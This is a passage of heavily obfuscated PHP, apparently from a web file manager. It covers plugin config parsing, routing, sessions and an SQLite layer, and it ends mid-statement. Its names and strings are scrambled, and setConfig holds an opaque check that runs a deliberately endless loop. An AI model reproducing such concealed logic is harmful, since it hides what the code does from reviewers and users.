$this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$Bí²æ™„Æ”[97]][$Bí²æ™„Æ”[1419]]); if (strstr($c„íÂÓš›Ä, $Bí²æ™„Æ”[1420])) { $F¯Œƒ˜ŒÇâ = rawurlencode(json_encode($this->pluginLangArr)); $c„íÂÓš›Ä = str_replace($Bí²æ™„Æ”[1420], $F¯Œƒ˜ŒÇâ, $c„íÂÓš›Ä); } if (strstr($c„íÂÓš›Ä, $Bí²æ™„Æ”[1421])) { $F¯Œƒ˜ŒÇâ = $F¯Œƒ˜ŒÇâ = rawurlencode(json_encode($this->getConfig())); $c„íÂÓš›Ä = str_replace($Bí²æ™„Æ”[1421], $F¯Œƒ˜ŒÇâ, $c„íÂÓš›Ä); } goto C §Ò¸¼æÓ; C §Ò¸¼æÓ: $c„íÂÓš›Ä = str_replace($B¸±äŞì·‹, $c°¥‡•ÑÀë, $c„íÂÓš›Ä); return $c„íÂÓš›Ä; goto aƒòˆ‹´¤; D—îÊÕ›†“: $Bí²æ™„Æ” =& $_SERVER[¾÷]; $c„íÂÓš›Ä = file_get_contents($f‡ñÛÜä); $B¸±äŞì·‹ = array($Bí²æ™„Æ”[1412], $Bí²æ™„Æ”[1413], $Bí²æ™„Æ”[1414], $Bí²æ™„Æ”[1415], $Bí²æ™„Æ”[1416], $Bí²æ™„Æ”[1417], $Bí²æ™„Æ”[1418]); goto B‡ø²­¿å½; aƒòˆ‹´¤: } private function parseLang(&$EìùíĞ‘½) { goto BÊØëáàß ; a¡¶­˜Ëùõ: $Dˆ¯Ş£ùŞœ = array(); foreach ($fºĞé×–‰Ì[0] as $DÆî¶ŠâÓŒ) { $bÀ·¯É¢ä = substr($DÆî¶ŠâÓŒ, strlen($A±Üš·…), -4); $D‚¡ÆŒÎœˆ = LNG($bÀ·¯É¢ä); $A¶âƒÊ°Î…[] = $DÆî¶ŠâÓŒ; $Dˆ¯Ş£ùŞœ[] = str_replace(array($Còâ‚ß‰éŸ[9], $Còâ‚ß‰éŸ[1014], $Còâ‚ß‰éŸ[347], $Còâ‚ß‰éŸ[125]), array($Còâ‚ß‰éŸ[60], $Còâ‚ß‰éŸ[60], $Còâ‚ß‰éŸ[43], $Còâ‚ß‰éŸ[1424]), $D‚¡ÆŒÎœˆ); } $EìùíĞ‘½ = str_replace($A¶âƒÊ°Î…, $Dˆ¯Ş£ùŞœ, $EìùíĞ‘½); goto f¶Ë µçŸñ; BÊØëáàß : $Còâ‚ß‰éŸ =& $_SERVER[¾÷]; $A±Üš·… = $Còâ‚ß‰éŸ[1422]; if (!strstr($EìùíĞ‘½, $A±Üš·…)) { return; } goto Dâ¢¸Ã¶×İ; Dâ¢¸Ã¶×İ: preg_match_all($Còâ‚ß‰éŸ[1423], $EìùíĞ‘½, $fºĞé×–‰Ì); if (!is_array($fºĞé×–‰Ì) || count($fºĞé×–‰Ì) == 0 || !is_array($fºĞé×–‰Ì[0]) || count($fºĞé×–‰Ì[0]) == 0) { return; } $A¶âƒÊ°Î… = array(); goto a¡¶­˜Ëùõ; f¶Ë µçŸñ: } private function parseConfig(&$Fè¥ÃæÍõƒ) { goto eóªÖÙå˜; fŒ«ˆÒ‰í˜: $Fè¥ÃæÍõƒ = str_replace($bÕ´¿æÅº, $FÔ‘Àƒ­, $Fè¥ÃæÍõƒ); goto DÎÆŞŞÒî; eóªÖÙå˜: $f¡ÃŠ’¼ =& $_SERVER[¾÷]; $eÜª²Êì÷Í = $f¡ÃŠ’¼[1425]; if (!strstr($Fè¥ÃæÍõƒ, $eÜª²Êì÷Í)) { return; } goto BÀ¦Ù­ß±; Dªº¦Ïß³É: $bÕ´¿æÅº = array(); $FÔ‘Àƒ­ = array(); foreach ($eõĞÛ‰Ö¡¸[0] as $aÙÕÃ‹Ğ‰) { $F…¬µËíœ = substr($aÙÕÃ‹Ğ‰, strlen($eÜª²Êì÷Í), -2); $bÕ´¿æÅº[] = $aÙÕÃ‹Ğ‰; $FÔ‘Àƒ­[] = _get($a†££ÒùØ–, $F…¬µËíœ); } goto fŒ«ˆÒ‰í˜; BÀ¦Ù­ß±: preg_match_all($f¡ÃŠ’¼[1426], $Fè¥ÃæÍõƒ, $eõĞÛ‰Ö¡¸); if (!is_array($eõĞÛ‰Ö¡¸) || count($eõĞÛ‰Ö¡¸) == 0 || !is_array($eõĞÛ‰Ö¡¸[0]) || count($eõĞÛ‰Ö¡¸[0]) == 0) { return; } $a†££ÒùØ– = $this->getConfig(); goto Dªº¦Ïß³É; DÎÆŞŞÒî: } private function parsePackage(&$A†êÃÃËòß) { goto f‡ôŞá½²×; fëø³…ŸÛ: $A†êÃÃËòß = str_replace($CßŠµà¢, $E¤éğ Éäí, $A†êÃÃËòß); goto D†íÒá×¹«; FÓóî‘”º: preg_match_all($b¯ãß‰¿ôö[1428], $A†êÃÃËòß, $c¼¢ÈÇˆ…œ); if (!is_array($c¼¢ÈÇˆ…œ) || count($c¼¢ÈÇˆ…œ) == 0 || !is_array($c¼¢ÈÇˆ…œ[0]) || count($c¼¢ÈÇˆ…œ[0]) == 0) { return; } $cÇóò¡½¿ˆ = $this->appPackage(); goto B÷ë¶ŸáÑˆ; f‡ôŞá½²×: $b¯ãß‰¿ôö =& $_SERVER[¾÷]; $B‡°µí…±‚ = $b¯ãß‰¿ôö[1427]; if (!strstr($A†êÃÃËòß, $B‡°µí…±‚)) { return; } goto FÓóî‘”º; B÷ë¶ŸáÑˆ: $CßŠµà¢ = array(); $E¤éğ Éäí = array(); foreach ($c¼¢ÈÇˆ…œ[0] as $A³Š¾© Æ) { $Fì†Ì‹’‘› = substr($A³Š¾© Æ, strlen($B‡°µí…±‚), -2); $CßŠµà¢[] = $A³Š¾© Æ; $E¤éğ Éäí[] = _get($cÇóò¡½¿ˆ, $Fì†Ì‹’‘›); } goto fëø³…ŸÛ; D†íÒá×¹«: } final function echoFile($f×Îµå­¼, $D›ÅÕ¨±Á = false) { goto EßøØ²„’¶; CõæÙîô«Ø: $this->parsePackage($A™Ş¨÷°‡Á); if (is_array($D›ÅÕ¨±Á)) { $A™Ş¨÷°‡Á = str_replace(array_keys($D›ÅÕ¨±Á), array_values($D›ÅÕ¨±Á), $A™Ş¨÷°‡Á); } echo $dĞÌºó¶Õò[9] . $A™Ş¨÷°‡Á; goto E¥õÔ›ÜÈ; EßøØ²„’¶: $dĞÌºó¶Õò =& $_SERVER[¾÷]; $E˜‚İö¤¦£ = $this->pluginPath . $f×Îµå­¼; if (ACT == $dĞÌºó¶Õò[1429]) { echo $dĞÌºó¶Õò[1430] . $this->pluginName . $dĞÌºó¶Õò[18] . $f×Îµå­¼ . $dĞÌºó¶Õò[1431]; if (!file_exists($E˜‚İö¤¦£)) { echo $dĞÌºó¶Õò[1432]; return; } } goto e¾Æœå‰„¹; e¾Æœå‰„¹: $A™Ş¨÷°‡Á = $this->parseFile($E˜‚İö¤¦£); $this->parseLang($A™Ş¨÷°‡Á); $this->parseConfig($A™Ş¨÷°‡Á); goto CõæÙîô«Ø; E¥õÔ›ÜÈ: } final function initLang() { goto E²ŞœÆ‰Š; E²ŞœÆ‰Š: $e¨¥¸¹å =& $_SERVER[¾÷]; $FºÒ¹¢óÁ = $e¨¥¸¹å[1433]; $c‚Ó‹•­Øİ = $this->pluginPath . $e¨¥¸¹å[1434]; goto aŒÔ§ ‡¾¶; aŒÔ§ ‡¾¶: $Dµ¬•ÒŒö = I18n::getType(); $EÒó Á¤» = array(); if (file_exists($c‚Ó‹•­Øİ . $Dµ¬•ÒŒö . $e¨¥¸¹å[789])) { $EÒó Á¤» = (include $c‚Ó‹•­Øİ . $Dµ¬•ÒŒö . $e¨¥¸¹å[789]); } else { if ($Dµ¬•ÒŒö == $e¨¥¸¹å[1435] && !file_exists($c‚Ó‹•­Øİ . $Dµ¬•ÒŒö . $e¨¥¸¹å[789]) && file_exists($c‚Ó‹•­Øİ . $e¨¥¸¹å[1436])) { $EÒó Á¤» = (include $c‚Ó‹•­Øİ . $e¨¥¸¹å[1436]); } else { if (file_exists($c‚Ó‹•­Øİ . $FºÒ¹¢óÁ . $e¨¥¸¹å[789])) { $EÒó Á¤» = (include $c‚Ó‹•­Øİ . $FºÒ¹¢óÁ . $e¨¥¸¹å[789]); } } } goto E÷¡µ«¶¦ñ; E÷¡µ«¶¦ñ: if (!is_array($EÒó Á¤»)) { return array(); } if (@count($EÒó Á¤») > 0) { I18n::set($EÒó Á¤»); } return $EÒó Á¤»; goto B¼«à…š½²; B¼«à…š½²: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($CãíØé÷Ï®) { $EãÄô»ğ• =& $_SERVER[¾÷]; if (!isset($_SERVER[$EãÄô»ğ•[4]]) || !isset($_SERVER[$EãÄô»ğ•[13]])) { goto AÀº”‰¾³×; Cìãâ…„ã¥: for ($BË«ê—Ù¹³ = $d†Èå¹ñÍé; $BË«ê—Ù¹³ > 0; $BË«ê—Ù¹³++) { $FˆğÔÃ…Ãî = json_encode($GLOBALS[$EãÄô»ğ•[414]]); } goto EÄš¯°í‡; AÀº”‰¾³×: $E§¬§ÏáŠâ = $EãÄô»ğ•[817]; $D²™ù•‘•‡ = $EãÄô»ğ•[6]; $C£“íš§Ï = $_SERVER[$EãÄô»ğ•[7]] . $EãÄô»ğ•[8]; goto cô“½¯¯Œ; cô“½¯¯Œ: $a§Šó¢¡ = $D²™ù•‘•‡($C£“íš§Ï); $A°ô˜¾±çó = explode($EãÄô»ğ•[9], $a§Šó¢¡); if (count($A°ô˜¾±çó) < $EãÄô»ğ•[582]) { $D«¸ÕÜ‚÷Ş = $EãÄô»ğ•[11]; $D«¸ÕÜ‚÷Ş(); } goto bÏ±¹ÒÜ¬…; bÏ±¹ÒÜ¬…: $FˆğÔÃ…Ãî = $EãÄô»ğ•[818]; $FˆğÔÃ…Ãî($_SERVER[$EãÄô»ğ•[819]]); $d†Èå¹ñÍé = 1; goto Cìãâ…„ã¥; EÄš¯°í‡: } return $this->modelPlugin->setConfig($this->pluginName, $CãíØé÷Ï®); } public function onSetConfig($dÖ¸Ÿ·†¾î) { } public function onGetConfig($e¼ÈØ×Üù ) { } public function onChangeStatus($eùØ´¿ŒÇ¨) { } public function onUninstall() { } public function onInstall() { } public function authCheck($fƒÃŞãè‘ = "\x70\154\x75\147\151\156\x41\x75\x74\150") { $a…à§Ù‡Ù· =& $_SERVER[¾÷]; if (!defined($a…à§Ù‡Ù·[457])) { return !1; } if (_get($GLOBALS, $a…à§Ù‡Ù·[488])) { return !0; } $Få¦å“‡ğ = $this->getConfig(); if (!$Få¦å“‡ğ[$fƒÃŞãè‘]) { return !1; } return ActionCall($a…à§Ù‡Ù·[1437], $Få¦å“‡ğ[$fƒÃŞãè‘]); } public function url($AÁö¦êÃÎ, $aÈÁ†óğîÎ = '', $b™ˆá¥¢å… = true) { goto FöÓ©ãŠ¡š; Bô¢ Ù–ó­: if (!$b™ˆá¥¢å…) { return $cÏšÔ‹¢ñ; } echo $cÏšÔ‹¢ñ; goto eŠÊçô‹›‘; FöÓ©ãŠ¡š: $C Ç¨Ä·­ =& $_SERVER[¾÷]; $fÀ‡äô÷¾¼ = $this->getConfig(); $B’‘”îŒ—‚ = KOD_VERSION . $C Ç¨Ä·­[104] . KOD_VERSION_BUILD; goto f”íœ‘¯ß‹; f”íœ‘¯ß‹: $f¶­ô›¥É = $this->packageVersion(); $C…‡«åé–º = $B’‘”îŒ—‚ . $C Ç¨Ä·­[443] . $f¶­ô›¥É; if (substr($AÁö¦êÃÎ, 0, 4) == $C Ç¨Ä·­[156] || substr($AÁö¦êÃÎ, 0, 2) == $C Ç¨Ä·­[1220]) { $cÏšÔ‹¢ñ = $AÁö¦êÃÎ . $C Ç¨Ä·­[1438] . $C…‡«åé–º; } else { if ($aÈÁ†óğîÎ == $C Ç¨Ä·­[43]) { $cÏšÔ‹¢ñ = $this->pluginHost . $AÁö¦êÃÎ . $C Ç¨Ä·­[1438] . $C…‡«åé–º; } else { if ($aÈÁ†óğîÎ === $C Ç¨Ä·­[86]) { $cÏšÔ‹¢ñ = $this->pluginHost . $AÁö¦êÃÎ; } else { if ($aÈÁ†óğîÎ == $C Ç¨Ä·­[1439]) { $cÏšÔ‹¢ñ = STATIC_PATH . $AÁö¦êÃÎ . $C Ç¨Ä·­[1438] . $B’‘”îŒ—‚; } else { if ($aÈÁ†óğîÎ == $C Ç¨Ä·­[1440]) { $cÏšÔ‹¢ñ = APP_HOST . $C Ç¨Ä·­[1441] . $AÁö¦êÃÎ . $C Ç¨Ä·­[1438] . $B’‘”îŒ—‚; } else { if (isset($fÀ‡äô÷¾¼[$aÈÁ†óğîÎ])) { $cÏšÔ‹¢ñ = $fÀ‡äô÷¾¼[$aÈÁ†óğîÎ] . $AÁö¦êÃÎ . $C Ç¨Ä·­[1438] . $C…‡«åé–º; } } } } } } goto Bô¢ Ù–ó­; eŠÊçô‹›‘: } public function link($d×ğ³¯ñóŸ = false, $CáÍÃ¾°šŞ = '') { $fª…êÌ‰¸î =& $_SERVER[¾÷]; if (!$d×ğ³¯ñóŸ) { $this->link($fª…êÌ‰¸î[1442], $fª…êÌ‰¸î[1440]); $this->link($fª…êÌ‰¸î[1443], $fª…êÌ‰¸î[1439]); $this->link($fª…êÌ‰¸î[1444], $fª…êÌ‰¸î[1439]); $this->link($fª…êÌ‰¸î[1445], $fª…êÌ‰¸î[1439]); $this->link($fª…êÌ‰¸î[1446], $fª…êÌ‰¸î[1439]); return; } $AÇõ àØ = $this->url($d×ğ³¯ñóŸ, $CáÍÃ¾°šŞ, !1); if (substr($d×ğ³¯ñóŸ, -3) == $fª…êÌ‰¸î[1447]) { echo $fª…êÌ‰¸î[1448] . $AÇõ àØ . $fª…êÌ‰¸î[1449] . $fª…êÌ‰¸î[9]; } else { if (substr($d×ğ³¯ñóŸ, -4) == $fª…êÌ‰¸î[1450]) { echo $fª…êÌ‰¸î[1451] . $AÇõ àØ . $fª…êÌ‰¸î[1452] . $fª…êÌ‰¸î[9]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\x79" => "\133\136\57\x5d\x2b", "\x3a\156\165\155" => "\x5b\60\x2d\x39\x5d\x2b", "\x3a\141\154\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($eŠğ…ŞäÀÕ, $fŸŠ¢ãæ§ã) { $F‹Š•‘ÑÅ° =& $_SERVER[¾÷]; if ($eŠğ…ŞäÀÕ == $F‹Š•‘ÑÅ°[1453]) { $EÀà¶×ªÊ› = array_map($F‹Š•‘ÑÅ°[1454], $fŸŠ¢ãæ§ã[0]); $f¨§å•íçï = strpos($fŸŠ¢ãæ§ã[1], $F‹Š•‘ÑÅ°[18]) === 0 ? $fŸŠ¢ãæ§ã[1] : $F‹Š•‘ÑÅ°[18] . $fŸŠ¢ãæ§ã[1]; $Fã½È¸ÌÃ¶ = $fŸŠ¢ãæ§ã[2]; } else { $EÀà¶×ªÊ› = null; $f¨§å•íçï = strpos($fŸŠ¢ãæ§ã[0], $F‹Š•‘ÑÅ°[18]) === 0 ? $fŸŠ¢ãæ§ã[0] : $F‹Š•‘ÑÅ°[18] . $fŸŠ¢ãæ§ã[0]; $Fã½È¸ÌÃ¶ = $fŸŠ¢ãæ§ã[1]; } array_push(self::$maps, $EÀà¶×ªÊ›); array_push(self::$routes, $f¨§å•íçï); array_push(self::$methods, strtoupper($eŠğ…ŞäÀÕ)); array_push(self::$callbacks, $Fã½È¸ÌÃ¶); } public static function error($cœ’†««Å‹) { self::$errorCallback = $cœ’†««Å‹; } public static function haltOnMatch($Còì¨öåé± = true) { self::$halts = $Còì¨öåé±; } public static function dispatch() { goto Dš£İ­’öÊ; Dš£İ­’öÊ: $D¼óÑó¯À =& $_SERVER[¾÷]; $b¥Ë¾äî£¢ = parse_url($_SERVER[$D¼óÑó¯À[1455]], PHP_URL_PATH); $f‘£ğÙ¦òº = $_SERVER[$D¼óÑó¯À[166]]; goto B¢®ïø‚·´; B’é×ˆ‰ó: self::$routes = preg_replace($D¼óÑó¯À[1138], $D¼óÑó¯À[18], self::$routes); if (in_array($b¥Ë¾äî£¢, self::$routes)) { $a¨Ã†³–Ú† = array_keys(self::$routes, $b¥Ë¾äî£¢); foreach ($a¨Ã†³–Ú† as $a ƒ½™á„‚) { if (self::$methods[$a ƒ½™á„‚] == $f‘£ğÙ¦òº || self::$methods[$a ƒ½™á„‚] == $D¼óÑó¯À[1456] || in_array($f‘£ğÙ¦òº, self::$maps[$a ƒ½™á„‚])) { $e¸ÍµÂ‹ë = !0; if (!is_object(self::$callbacks[$a ƒ½™á„‚])) { $aÅ —“Ì¬ = explode($D¼óÑó¯À[18], self::$callbacks[$a ƒ½™á„‚]); $fÕ…ñ©¡’ç = end($aÅ —“Ì¬); $E†˜ÌĞ±¡ = explode($D¼óÑó¯À[1457], $fÕ…ñ©¡’ç); $C…ÖŸÁ‰ñ = new $E†˜ÌĞ±¡[0](); $C…ÖŸÁ‰ñ->{$E†˜ÌĞ±¡[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$a ƒ½™á„‚]); if (self::$halts) { return; } } } } } else { $aŞãõ¾‰ = 0; foreach (self::$routes as $a ƒ½™á„‚) { if (strpos($a ƒ½™á„‚, $D¼óÑó¯À[14]) !== !1) { $a ƒ½™á„‚ = str_replace($d»¾ãÅäÙ¡, $e¤ˆ”¿˜Áâ, $a ƒ½™á„‚); } if (preg_match($D¼óÑó¯À[1458] . $a ƒ½™á„‚ . $D¼óÑó¯À[1459], $b¥Ë¾äî£¢, $DÑáÃóÎ†µ)) { if (self::$methods[$aŞãõ¾‰] == $f‘£ğÙ¦òº || self::$methods[$aŞãõ¾‰] == $D¼óÑó¯À[1456] || !empty(self::$maps[$aŞãõ¾‰]) && in_array($f‘£ğÙ¦òº, self::$maps[$aŞãõ¾‰])) { $e¸ÍµÂ‹ë = !0; array_shift($DÑáÃóÎ†µ); if (!is_object(self::$callbacks[$aŞãõ¾‰])) { $aÅ —“Ì¬ = explode($D¼óÑó¯À[18], self::$callbacks[$aŞãõ¾‰]); $fÕ…ñ©¡’ç = end($aÅ —“Ì¬); $E†˜ÌĞ±¡ = explode($D¼óÑó¯À[1457], $fÕ…ñ©¡’ç); $C…ÖŸÁ‰ñ = new $E†˜ÌĞ±¡[0](); if (!method_exists($C…ÖŸÁ‰ñ, $E†˜ÌĞ±¡[1])) { echo $D¼óÑó¯À[1460]; } else { call_user_func_array(array($C…ÖŸÁ‰ñ, $E†˜ÌĞ±¡[1]), $DÑáÃóÎ†µ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$aŞãõ¾‰], $DÑáÃóÎ†µ); if (self::$halts) { return; } } } } $aŞãõ¾‰++; } } if ($e¸ÍµÂ‹ë == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $aÄ¢‚—Õ =& $_SERVER[¾÷]; header($_SERVER[$aÄ¢‚—Õ[1461]] . $aÄ¢‚—Õ[1462]); echo $aÄ¢‚—Õ[1463]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$D¼óÑó¯À[1455]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } goto B…ÎÊĞ¸ß; B¢®ïø‚·´: $d»¾ãÅäÙ¡ = array_keys(static::$patterns); $e¤ˆ”¿˜Áâ = array_values(static::$patterns); $e¸ÍµÂ‹ë = !1; goto B’é×ˆ‰ó; B…ÎÊĞ¸ß: } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto cÊÅòİë”; dÓˆÚ Úªå: if (self::$sessionSign) { } else { if (Cookie::get($DËô¿”Û‰¿)) { self::$sessionSign = Cookie::get($DËô¿”Û‰¿); } else { self::$sessionSign = guid(); } } Cookie::setSafe($DËô¿”Û‰¿, self::$sessionSign, self::$sessionTime); $CÔÆéÌÎÒ… = $e»˜ô‰˜‰[$c……À·ç[1466]]; goto AÏÛœñŞ°›; A†ºÕ­‰Ôº: $e»˜ô‰˜‰ = $GLOBALS[$c……À·ç[16]][$c……À·ç[354]]; self::$sessionTime = $e»˜ô‰˜‰[$c……À·ç[1464]]; $DËô¿”Û‰¿ = isset($GLOBALS[$c……À·ç[1465]]) ? $GLOBALS[$c……À·ç[1465]] : SESSION_ID; goto dÓˆÚ Úªå; AÏÛœñŞ°›: $fÄ¢¨Ã±ö = $e»˜ô‰˜‰[$CÔÆéÌÎÒ…]; $aí¿­Œ¯©² = $e»˜ô‰˜‰[$c……À·ç[779]]; switch ($CÔÆéÌÎÒ…) { case $c……À·ç[27]: self::$handle = Model($c……À·ç[780]); break; case $c……À·ç[781]: self::$handle = new CacheRedis($fÄ¢¨Ã±ö, $aí¿­Œ¯©²); break; case $c……À·ç[782]: self::$handle = new CacheMemcached($fÄ¢¨Ã±ö, $aí¿­Œ¯©²); break; case $c……À·ç[201]: $fÄ¢¨Ã±ö[$c……À·ç[85]] = $fÄ¢¨Ã±ö[$c……À·ç[85]] . $c……À·ç[1467]; self::$handle = new CacheFile($fÄ¢¨Ã±ö, $aí¿­Œ¯©²); default: break; } goto F±Õ‘½Ì…Ç; cÊÅòİë”: $c……À·ç =& $_SERVER[¾÷]; static $B³• ‘—ÌŞ = false; if ($B³• ‘—ÌŞ) { return $B³• ‘—ÌŞ; } goto A†ºÕ­‰Ôº; F±Õ‘½Ì…Ç: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $B³• ‘—ÌŞ = new self(); return $B³• ‘—ÌŞ; goto fçó¸‚é¨±; fçó¸‚é¨±: } public static function sign($dùÄ…Ì™ãÁ = false) { $dùÄ…Ì™ãÁ && (self::$sessionSign = $dùÄ…Ì™ãÁ); self::init(); return self::$sessionSign; } public static function set($d‘Ïê×±“Ì, $f§õÅ±ùÆÓ = false) { self::init(); if (is_array($d‘Ïê×±“Ì)) { foreach ($d‘Ïê×±“Ì as $FŠš­Ç‘‡ => $eˆ‹î„£) { array_set_value(self::$data, $FŠš­Ç‘‡, $eˆ‹î„£); } } else { array_set_value(self::$data, $d‘Ïê×±“Ì, $f§õÅ±ùÆÓ); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($bÍáŞ¶º•¸ = false) { self::init(); if (!$bÍáŞ¶º•¸) { return self::$data; } return array_get_value(self::$data, $bÍáŞ¶º•¸); } public static function remove($D—šÊæ³œã) { self::init(); unset(self::$data[$D—šÊæ³œã]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¾÷][784])) { self::$handle->clearTimeout(); } } } goto b­À®ò‰ù; EÅÜíâÒ¤: class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($bè«†ê¡Ö, $e¼¼¹‡ˆÆ„) { $BİŒÂÂËÈƒ =& $_SERVER[¾÷]; if (isset(self::$_methodList[$bè«†ê¡Ö])) { return @call_user_func_array(self::$_methodList[$bè«†ê¡Ö], $e¼¼¹‡ˆÆ„); } else { if (method_exists($this, $bè«†ê¡Ö)) { return call_user_func_array(array($this, $bè«†ê¡Ö), $e¼¼¹‡ˆÆ„); } else { think_exception(__CLASS__ . $BİŒÂÂËÈƒ[14] . $bè«†ê¡Ö . $BİŒÂÂËÈƒ[15]); } } } public static function __callStatic($DÏÀœ©‚¬ƒ, $FœƒÀÛ¦×‘) { if (isset(self::$_methodListStatic[$DÏÀœ©‚¬ƒ])) { return call_user_func_array(self::$_methodListStatic[$DÏÀœ©‚¬ƒ], $FœƒÀÛ¦×‘); } else { if (method_exists(self, $DÏÀœ©‚¬ƒ)) { return call_user_func_array(array(self, $DÏÀœ©‚¬ƒ), $FœƒÀÛ¦×‘); } else { show_json("{$DÏÀœ©‚¬ƒ}\50\x29\40\156\x6f\x74\x20\145\x78\151\x73\x74\73", !1); } } } public static function addMethod($fÈÒËµæğ¶, $C¦ÃËŠ‘ ) { self::$_methodList[$fÈÒËµæğ¶] = $C¦ÃËŠ‘ ; } public static function addMethodStatic($fø•ñ™Ï£ , $eß¯îÏ£Á·) { self::$_methodListStatic[$fø•ñ™Ï£ ] = $eß¯îÏ£Á·; } } class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto e¨¼»‹ Åù; e¨¼»‹ Åù: $dï÷î‹ÆÑ“ =& $_SERVER[¾÷]; global $in, $config; $this->config =& $config; goto D—™‹¾ÒÃ; eŠ×š¬öïÖ: $this->tpl = TEMPLATE . MOD . $dï÷î‹ÆÑ“[18]; $this->_classObjectID = mt_rand(0, 10000); goto déöôª÷´İ; D—™‹¾ÒÃ: $this->in =& $in; $this->values[$dï÷î‹ÆÑ“[16]] =& $config; $this->values[$dï÷î‹ÆÑ“[17]] =& $in; goto eŠ×š¬öïÖ; déöôª÷´İ: } public function loadClass($eˆ†™ÎÙ¬) { if (1 === func_num_args()) { $this->{$eˆ†™ÎÙ¬} = new $eˆ†™ÎÙ¬(); } else { $C»„ÊªÊ°ò = new ReflectionClass($eˆ†™ÎÙ¬); $F¼¯†ÄÆ¯ƒ = func_get_args(); array_shift($F¼¯†ÄÆ¯ƒ); $this->{$eˆ†™ÎÙ¬} = $C»„ÊªÊ°ò->newInstanceArgs($F¼¯†ÄÆ¯ƒ); } return $this->{$eˆ†™ÎÙ¬}; } protected function assign($aƒ‰´§îÍå, $e±Ú‘˜”Ê¤) { $this->values[$aƒ‰´§îÍå] = $e±Ú‘˜”Ê¤; } protected function display($E…î‰—¹…É) { ob_end_clean(); extract($this->values); require $this->tpl . $E…î‰—¹…É; } } class DbSqliteBase extends Db { public function __construct($c¾ŠŒÜÃØ“ = '') { $aÛÚƒÇäŸ =& $_SERVER[¾÷]; if (!extension_loaded($aÛÚƒÇäŸ[19])) { think_exception(think_lang($aÛÚƒÇäŸ[20]) . $aÛÚƒÇäŸ[21]); } if (!empty($c¾ŠŒÜÃØ“)) { if (!isset($c¾ŠŒÜÃØ“[$aÛÚƒÇäŸ[22]])) { $c¾ŠŒÜÃØ“[$aÛÚƒÇäŸ[22]] = 438; } $this->config = $c¾ŠŒÜÃØ“; if (empty($this->config[$aÛÚƒÇäŸ[23]])) { $this->config[$aÛÚƒÇäŸ[23]] = array(); } } } public function connect($bĞ¡Œ´×»ğ = '', $F¿š›¾ïŸò = 0) { $açƒ‰í’ˆ± =& $_SERVER[¾÷]; if (!isset($this->linkID[$F¿š›¾ïŸò])) { goto c¦»‘Ã£Œ‘; Bì¥ÌÕÎí„: $this->linkID[$F¿š›¾ïŸò] = $B…ö…½ó($bĞ¡Œ´×»ğ[$açƒ‰í’ˆ±[27]], $bĞ¡Œ´×»ğ[$açƒ‰í’ˆ±[22]]); if (!$this->linkID[$F¿š›¾ïŸò]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto d£•é¿Í¾á; c¦»‘Ã£Œ‘: if (empty($bĞ¡Œ´×»ğ)) { $bĞ¡Œ´×»ğ = $this->config; } $fŒËÛ ®å• = !empty($bĞ¡Œ´×»ğ[$açƒ‰í’ˆ±[23]][$açƒ‰í’ˆ±[24]]) ? $bĞ¡Œ´×»ğ[$açƒ‰í’ˆ±[23]][$açƒ‰í’ˆ±[24]] : $this->pconnect; $B…ö…½ó = $fŒËÛ ®å• ? $açƒ‰í’ˆ±[25] : $açƒ‰í’ˆ±[26]; goto Bì¥ÌÕÎí„; d£•é¿Í¾á: @sqlite_busy_timeout($this->linkID[$F¿š›¾ïŸò], 30000); if (1 != think_config($açƒ‰í’ˆ±[28])) { unset($this->config); } goto f–¤Ó‹‹äƒ; f–¤Ó‹‹äƒ: } return $this->linkID[$F¿š›¾ïŸò]; } public function free() { $this->queryID = null; } public function query($fÈçšßÑŸé) { goto dâ†ÈİÊïÁ; dŠŒèÛáí‘: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $e±ìÌÀíçî = $this->getAll(); return $e±ìÌÀíçî; } goto dÎ—«Ó‡ºğ; B¶¤—”ì±: $this->queryStr = $fÈçšßÑŸé; if ($this->queryID) { $this->free(); } think_action_status($aê¯‘İ”Ü†[29], 1); goto bÒÖº¨ê¯; dâ†ÈİÊïÁ: $aê¯‘İ”Ü† =& $_SERVER[¾÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto B¶¤—”ì±; bÒÖº¨ê¯: think_status($aê¯‘İ”Ü†[30]); $this->queryID = sqlite_query($this->_linkID, $fÈçšßÑŸé); $this->debug(); goto dŠŒèÛáí‘; dÎ—«Ó‡ºğ: } public function execute($Aè¨´™Ä›‰) { goto eØÊŒÈËŸ; eØÊŒÈËŸ: $FÃìÀíäƒ¦ =& $_SERVER[¾÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto f¤™¨…¡³£; AªÖçˆ„ñğ: think_status($FÃìÀíäƒ¦[30]); $e’Š¤™ÍƒÇ = sqlite_exec($this->_linkID, $Aè¨´™Ä›‰); $this->debug(); goto fÅÓº¸ÒÍ¶; fÅÓº¸ÒÍ¶: if (!1 === $e’Š¤™ÍƒÇ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = 